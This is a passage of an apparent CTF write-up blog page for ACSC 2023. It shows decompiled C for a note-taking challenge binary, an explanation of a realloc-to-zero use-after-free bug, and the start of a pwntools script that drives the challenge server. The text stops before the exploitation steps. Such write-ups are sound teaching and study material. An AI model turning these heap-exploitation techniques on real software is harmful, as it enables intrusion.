<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>ACSC 2023 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99"><meta property="og:title" content="ACSC 2023" />
<meta property="og:description" content="Writeup for ACSC 2023 by Chovid99" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chovid99.github.io/posts/acsc-2023/" /><meta property="og:image" content="https://chovid99.github.io/C99-web-card.png" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-02-26T14:18:58+07:00" />
<meta property="article:modified_time" content="2023-02-27T13:38:26+07:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png" /><meta name="twitter:title" content="ACSC 2023"/>
<meta name="twitter:description" content="Writeup for ACSC 2023 by Chovid99"/>
      <meta name="twitter:site" content="@Chovid99"/>
<meta name="application-name" content="Chovid99&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/acsc-2023/" /><link rel="prev" href="https://chovid99.github.io/posts/hacktm-ctf-2023/" /><link rel="next" href="https://chovid99.github.io/posts/cyber-apocalypse-2023-pwn/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "ACSC 2023",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/chovid99.github.io\/posts\/acsc-2023\/"
        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, ACSC, pwn, hardware, ssti, sd-card, heap, libc-2.35, fsop, 2023","wordcount":  8257 ,
        "url": "https:\/\/chovid99.github.io\/posts\/acsc-2023\/","datePublished": "2023-02-26T14:18:58+07:00","dateModified": "2023-02-27T13:38:26+07:00","publisher": {
            "@type": "Organization",
            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                "@type": "Person",
                "name": "Chovid99"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                
                
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">ACSC 2023</h1><div class="post-meta">
            <div class="post-meta-line">
                </div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Feb 26, 2023">Feb 26, 2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;8257 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;39 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#re-300-pts">re (300 pts)</a>
          <ul>
            <li><a href="#initial-analysis">Initial Analysis</a></li>
            <li><a href="#exploitation">Exploitation</a>
              <ul>
                <li><a href="#understanding-how-realloc-works">Understanding how <code>realloc</code> works</a></li>
                <li><a href="#combining-the-bug-with-how-realloc-works">Combining the bug with how <code>realloc</code> works</a></li>
                <li><a href="#get-heap-address-leak">Get heap address leak</a></li>
                <li><a href="#get-libc-address-leak">Get libc address leak</a></li>
                <li><a href="#gain-code-execution">Gain Code Execution</a></li>
              </ul>
            </li>
            <li><a href="#full-script">Full Script</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#web">Web</a>
      <ul>
        <li><a href="#easyssti-200-pts">easySSTI (200 pts)</a>
          <ul>
            <li><a href="#initial-analysis-1">Initial Analysis</a></li>
            <li><a href="#exploitation-1">Exploitation</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#hardware">Hardware</a>
      <ul>
        <li><a href="#hardware-is-not-so-hard-100-pts">Hardware is not so hard (100 pts)</a>
          <ul>
            <li><a href="#initial-analysis-2">Initial Analysis</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#social-media">Social Media</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><figure><a class="lightgallery" href="https://i.imgur.com/st6T2fx.png" title="https://i.imgur.com/st6T2fx.png" data-thumbnail="https://i.imgur.com/st6T2fx.png" data-sub-html="<h2>ACSC 2023</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/st6T2fx.png"
            data-srcset="https://i.imgur.com/st6T2fx.png, https://i.imgur.com/st6T2fx.png 1.5x, https://i.imgur.com/st6T2fx.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/st6T2fx.png" />
    </a><figcaption class="image-caption">ACSC 2023</figcaption>
    </figure>
<p>This weekend, I spent my time competing at ACSC 2023. I got the 35th place, so I won&rsquo;t be qualified. The challenges are good, so I decided to create this writeup for my future notes in case I faced similar problems. Below is my writeup for some of the challenges that I managed to solve.</p>
<h1 id="pwn">Pwn</h1>
<h2 id="re-300-pts">re (300 pts)</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>Sometimes you want to rewrite notes.</p>
<p>nc re.chal.ctf.acsc.asia 9999</p>
<p>nc re-2.chal.ctf.acsc.asia 7352 (Backup)</p>
</div>
        </div>
    </div>
<h3 id="initial-analysis">Initial Analysis</h3>
<p>We were given a binary file called <code>chall</code> and the libc as well. Checking the given libc, it is <code>libc-2.35</code>. Let&rsquo;s try to disassemble the binary first.</p>
<p><strong>main</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">do</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">MENU</span><span class="se">\n</span><span class="s">1. Edit</span><span class="se">\n</span><span class="s">2. List</span><span class="se">\n</span><span class="s">0. Exit</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v3</span> <span class="o">=</span> <span class="nf">getint</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">9</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span> <span class="n">memo_size</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">i</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="n">memo_arr</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">argv</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[%d] %.*s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">memo_size</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">i</span><span class="p">],</span> <span class="n">memo_arr</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v3</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nf">edit</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">MENU</span><span class="se">\n</span><span class="s">1. Edit</span><span class="se">\n</span><span class="s">2. List</span><span class="se">\n</span><span class="s">0. Exit</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">,</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">argv</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Bye.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>edit</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">edit</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-10h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">alloc_ptr</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="nf">getint</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">&gt;</span> <span class="mi">9</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Out of list&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Size: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">size</span> <span class="o">=</span> <span class="nf">getint</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x78</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Too big memo&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">alloc_ptr</span> <span class="o">=</span> <span class="nf">realloc</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">memo_arr</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v3</span><span class="p">),</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="n">size</span> <span class="o">&gt;</span> <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">memo_size</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v3</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">memo_arr</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v3</span><span class="p">)</span> <span class="o">=</span> <span class="n">alloc_ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">memo_size</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v3</span><span class="p">)</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Memo: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">getnline</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">memo_arr</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v3</span><span class="p">),</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Done&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, so looking at the disassembly, we can get some informations related to it:</p>
<ul>
<li>Even though the disassembly gave us two array called <code>memo_arr</code> and <code>memo_size</code>, it&rsquo;s actually just an array of struct, where the struct consists of:
<ul>
<li>Size</li>
<li>Pointer to the memo</li>
</ul>
</li>
<li>The max elements of the array are <code>10</code></li>
<li>There is only two feature, <code>edit</code> and <code>list</code>.
<ul>
<li><code>list</code> will iterate through the array, and then print the content only if the element size is not <code>0</code>.</li>
<li><code>edit</code> will allow you to call <code>realloc</code> on the array elements.
<ul>
<li>Max <code>size</code> is <code>0x78</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<p>So, the binary doesn&rsquo;t use <code>malloc</code> or <code>free</code>, but it only use <code>realloc</code> to control the <code>chunks</code>. AFAIK, how <code>realloc</code> works:</p>
<ul>
<li><code>realloc(NULL, new_size)</code> is equivalent to normal <code>malloc</code></li>
<li><code>realloc(ptr, new_size)</code> will have different behaviors:
<ul>
<li>If <code>new_size</code> is the same, it will return the same chunk</li>
<li>Else:
<ul>
<li>if <code>new_size</code> is smaller, it will free the chunk and resize it to smaller size. The remainder will be placed in free list.</li>
<li>If <code>new_size</code> is bigger, it will free the current chunk and return a new bigger chunk.</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>Now, what if the <code>new_size</code> is <code>0</code>? Basically, it is the same as <code>free</code>!</p>
<p>If you see on the <code>edit</code> function, it doesn&rsquo;t handle properly if we try to <code>realloc</code> a chunk to <code>0</code>. It <strong>didn&rsquo;t nullify</strong> the <code>ptr</code> stored in the <code>memo</code> array. This is the bug that we will abuse. The initial analysis is finished, so now it&rsquo;s time to think how to exploit this bug.</p>
<h3 id="exploitation">Exploitation</h3>
<h4 id="understanding-how-realloc-works">Understanding how <code>realloc</code> works</h4>
<p>Because I&rsquo;m not too familiar with how <code>realloc</code> works, I decided to play around it first. Let&rsquo;s build our helper first so that we can interact with the binary easier.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./chall_patched&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ld</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./ld-2.35.so&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;latin&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">remote_url</span> <span class="o">=</span> <span class="s2">&#34;re-2.chal.ctf.acsc.asia&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">remote_port</span> <span class="o">=</span> <span class="mi">7352</span>
</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">PLT_DEBUG</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># gdb.attach(r, gdbscript=gdbscript)</span>
</span></span><span class="line"><span class="cl">            <span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">remote_url</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">memo</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Index: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Size: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Memo: &#39;</span><span class="p">,</span> <span class="n">memo</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">list</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">MENU&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exit_program</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Some behavior that I notice. during testing:</p>
<ul>
